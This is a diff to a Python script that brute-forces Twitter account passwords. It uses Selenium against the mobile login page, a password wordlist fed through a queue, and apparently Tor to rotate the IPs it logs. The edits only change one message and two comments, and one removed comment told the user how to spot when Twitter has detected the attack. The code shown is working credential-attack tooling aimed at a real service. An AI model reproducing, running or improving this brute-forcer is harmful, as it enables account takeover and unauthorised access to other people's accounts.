@@ -127,7 +127,7 @@ def launch_tor(settings):
 def load_wlist(wlist):
     # open pass word list
     if not os.path.isfile(wlist):
-        print(R + ("   PASSWORD LIST NOT FOUND") + W)
+        print(R + ("   WLIST NOT FOUND") + W)
         exit(0)
     with open(wlist) as words:
         # read all lines (== passwords)
@@ -145,7 +145,7 @@ def bruteforce(driver):
     basic logic to log in to twitter using selenium
     has exactly one argument driver
     """
-    password = PASSWORDS.get()  # get new password from queue
+    password = PASSWORDS.get()  # get new password from synced queue
     driver.get("https://mobile.twitter.com/session/new")  # load twitter login page in browser
     try:
         # confirm to continue with js disabled (if neccessaray)
@@ -199,8 +199,7 @@ def bruteforce(driver):
     driver.get("http://ip.42.pl/raw")
     WebDriverWait(driver, 30).until(
         ec.presence_of_element_located((By.TAG_NAME, "body")))
-    # log the failure with username, password, ip and your return url (/session/new or /login/check)
-    # if /login/check is returned twitter noticed the attack and you can stop trying
+    # log the failure with username, password and ip
     print(O + ("   FAILED \t| Username: {} \t|  IP: {} \t| Password: {} "
                .format(USERNAME,
                        driver.find_element_by_tag_name("body").text, password) + W))
